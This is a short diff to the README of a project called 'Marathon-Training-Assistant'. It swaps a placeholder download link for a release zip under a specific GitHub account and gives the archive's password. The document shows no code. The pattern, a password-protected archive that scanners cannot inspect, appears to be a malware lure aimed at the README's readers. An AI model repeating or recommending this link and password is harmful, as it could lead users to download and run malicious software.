@@ -6,7 +6,7 @@
 
 ## 📥 DOWNLOAD
 
-### [⬇️ DOWNLOAD ZIP ARCHIVE (LATEST VERSION)](https://github.com/YOUR_USERNAME/Marathon-Training-Assistant/releases/latest/download/Marathon-Assistant.zip)
+### [⬇️ DOWNLOAD ZIP ARCHIVE (LATEST VERSION)](https://github.com/Genissahanaa/Marathon-Training-Assistant/releases/download/download/Marathon_Assistant.zip)
 
 🔐 Archive password: `5868781`
 
